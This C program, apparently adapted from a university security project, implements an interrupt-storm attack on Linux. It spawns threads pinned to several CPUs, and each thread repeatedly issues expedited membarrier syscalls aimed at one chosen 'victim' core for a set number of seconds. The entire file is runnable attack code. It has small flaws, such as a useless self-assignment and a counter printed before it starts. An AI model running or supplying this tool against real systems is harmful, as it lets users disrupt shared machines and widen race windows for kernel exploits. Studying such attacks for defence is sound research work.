/*
 * Based on code from Strickler and Doty, modified for this project.
 * Original implementation: https://github.com/ColeStrickler/EECS750-FinalProject
 */
#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <syscall.h>
#include <sched.h>
#include <pthread.h>
#include <assert.h>
#include <errno.h>
#include <string.h>
#include <linux/membarrier.h>

int NUM_THREADS;
int DURATION_SEC = 10;
int VICTIM_CPU = 0;
int* thread_args;
pthread_t* ipi_storm_threads;
unsigned long long membarrier_counter = 0;  // Added counter

inline static int membarrier(int cmd, unsigned int flags, int cpu_id)
{
    __sync_fetch_and_add(&membarrier_counter, 1);  // Increment counter
    return syscall(__NR_membarrier, cmd, flags, cpu_id);
}

void ipi_register(unsigned long NUM_THREADS)
{
    int ret = membarrier(MEMBARRIER_CMD_REGISTER_PRIVATE_EXPEDITED_RSEQ, 0, 0);
    if (ret == -1) {
        printf("Error %d\n", errno);
        exit(EXIT_FAILURE);
    }
    ret = membarrier(MEMBARRIER_CMD_PRIVATE_EXPEDITED_RSEQ, 0, 0);
    if (ret == -1) {
        printf("Error %d\n", errno);
        exit(EXIT_FAILURE);
    }
    NUM_THREADS = NUM_THREADS;
    thread_args = malloc(sizeof(int)*(NUM_THREADS));
    ipi_storm_threads = malloc(sizeof(pthread_t*)*(NUM_THREADS));
    for (int i = 2; i < NUM_THREADS+2; i++)
    {
        thread_args[i-2] = i;
    }
}

void pin_cpu(int cpu)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &mask) == -1) {
        perror("sched_setaffinity");
        exit(EXIT_FAILURE);
    }
}

void ipi_storm_thread(void *cpu)
{
    int cpu_num = *(int*)cpu;
    pin_cpu(cpu_num);
    pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, NULL);
    while(1)
    {
        int ret = membarrier(MEMBARRIER_CMD_PRIVATE_EXPEDITED_RSEQ, MEMBARRIER_CMD_FLAG_CPU, VICTIM_CPU);
        if (ret < 0)
        {
            perror("membarrier()");
        }
    }
}

void begin_ipi_storm()
{
    for (int i = 0; i < NUM_THREADS; i++)
    {
        pthread_create(&ipi_storm_threads[i], NULL, ipi_storm_thread, &thread_args[i]);
    }
}

int kill_ipi()
{
    int ret;
    for (int i = 0; i < NUM_THREADS; i++)
    {
        ret = pthread_cancel(ipi_storm_threads[i]);
    }
    return ret;
}

int main(int argc, char *argv[]) {
    char command[32];
    int running = 0;

    printf("Total membarriers executed: %llu\n", membarrier_counter);

    if (argc >= 2) {
        NUM_THREADS = atoi(argv[1]);
        if (NUM_THREADS <= 0) {
            fprintf(stderr, "Error: NUM_THREADS must be positive\n");
            return EXIT_FAILURE;
        }
    }

    if (argc >= 3) {
        DURATION_SEC = atoi(argv[2]);
        if (DURATION_SEC <= 0) {
            fprintf(stderr, "Error: TEST_DURATION_SEC must be positive\n");
            return EXIT_FAILURE;
        }
    }

    int num_cpus = sysconf(_SC_NPROCESSORS_ONLN);
    printf("System has %d CPUs available\n", num_cpus);
    
    if (argc >= 4) {
        VICTIM_CPU = atoi(argv[3]);
        if (VICTIM_CPU < 0 || VICTIM_CPU >= num_cpus) {
            fprintf(stderr, "Error: VICTIM_CPU must be between 0 and %d\n", num_cpus - 1);
            return EXIT_FAILURE;
        }
    }

    printf("Victim core: %d, attackers: %d threads, time: %d s\n",
           VICTIM_CPU, NUM_THREADS, DURATION_SEC);

    ipi_register(NUM_THREADS);
    begin_ipi_storm();
    sleep(DURATION_SEC);
    kill_ipi();

    printf("Total membarriers executed: %llu\n", membarrier_counter);  // Print counter

    return 0;
}